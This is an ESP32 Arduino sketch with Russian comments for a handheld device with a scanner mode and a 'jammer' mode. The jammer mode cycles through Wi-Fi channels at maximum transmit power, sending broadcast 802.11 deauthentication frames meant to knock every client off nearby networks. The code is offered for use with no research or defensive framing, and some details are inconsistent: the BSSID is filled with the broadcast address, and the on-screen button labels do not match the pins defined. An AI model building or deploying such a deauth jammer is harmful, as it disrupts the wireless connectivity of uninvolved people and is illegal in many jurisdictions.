#include <U8g2lib.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ===== OLED (I2C) =====
U8G2_SSD1306_128x64_NONAME_F_SW_I2C u8g2(U8G2_R0, 22, 21, U8X8_PIN_NONE);

// ===== Кнопки (GPIO) =====
#define BTN_MODE   13   // Переключение режима
#define BTN_ACTION 27  // Запуск/Остановка

// ===== Глобальные переменные =====
uint8_t mode = 0;        // 0 - сканер, 1 - глушилка
bool running = false;
uint8_t channel = 1;

// ====================================================
// Режим 1: Сканер Wi-Fi сетей
// ====================================================
void scanner_mode() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);
  u8g2.drawStr(0, 15, "SCANNING...");
  u8g2.sendBuffer();

  int n = WiFi.scanNetworks(false, true);

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);
  u8g2.drawStr(0, 15, "=== NETWORKS ===");

  for (int i = 0; i < min(n, 4); i++) {
    u8g2.drawStr(0, 30 + i * 12, WiFi.SSID(i).c_str());
  }
  u8g2.sendBuffer();
  delay(3000);
  WiFi.scanDelete();
}

// ====================================================
// Режим 2: Глушилка (Deauth-атака)
// ====================================================
void send_deauth(uint8_t *bssid) {
  uint8_t deauth_pkt[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  };
  memcpy(&deauth_pkt[10], bssid, 6);
  memcpy(&deauth_pkt[16], bssid, 6);
  memcpy(&deauth_pkt[22], (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, 26, false);
  memcpy(&deauth_pkt[22], (uint8_t*)"\x00\x00\x00\x00\x00\x00", 6);
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, 26, false);
}

void jammer_mode() {
  // Переключаемся по каналам 1-14
  if (channel > 14) channel = 1;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Отправляем deauth-кадры на широковещательный MAC (все клиенты)
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  send_deauth(broadcast);

  channel++;

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);
  u8g2.drawStr(0, 20, "JAMMING");
  u8g2.drawStr(0, 40, "Ch: ");
  u8g2.drawStr(24, 40, String(channel - 1).c_str());
  u8g2.sendBuffer();
}

// ====================================================
// Меню и управление
// ====================================================
void draw_menu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);

  if (mode == 0) {
    u8g2.drawStr(0, 20, "Mode: SCANNER");
  } else {
    u8g2.drawStr(0, 20, "Mode: JAMMER");
  }

  u8g2.drawStr(0, 40, running ? "RUNNING" : "STOPPED");
  u8g2.drawStr(0, 55, "BTN0: Mode | BTN15: Start/Stop");
  u8g2.sendBuffer();
}

void setup() {
  pinMode(BTN_MODE, INPUT_PULLUP);
  pinMode(BTN_ACTION, INPUT_PULLUP);

  u8g2.begin();

  // Инициализация Wi-Fi в режиме без подключения
  WiFi.mode(WIFI_MODE_NULL);
  esp_wifi_init(&(wifi_init_config_t)WIFI_INIT_CONFIG_DEFAULT());
  esp_wifi_start();
  esp_wifi_set_max_tx_power(0x4B); // Максимальная мощность
}

void loop() {
  // Обработка кнопок
  if (!digitalRead(BTN_MODE)) {
    mode = (mode + 1) % 2;  // Переключение режима
    running = false;
    delay(300);
  }

  if (!digitalRead(BTN_ACTION)) {
    running = !running;
    if (running && mode == 0) {
      // При запуске сканера сразу выполняем сканирование
      scanner_mode();
      running = false;
    }
    delay(300);
  }

  // Выполнение активного режима
  if (running && mode == 1) {
    jammer_mode();
    delay(100);  // Скорость переключения каналов
  } else {
    draw_menu();
    delay(200);
  }
}
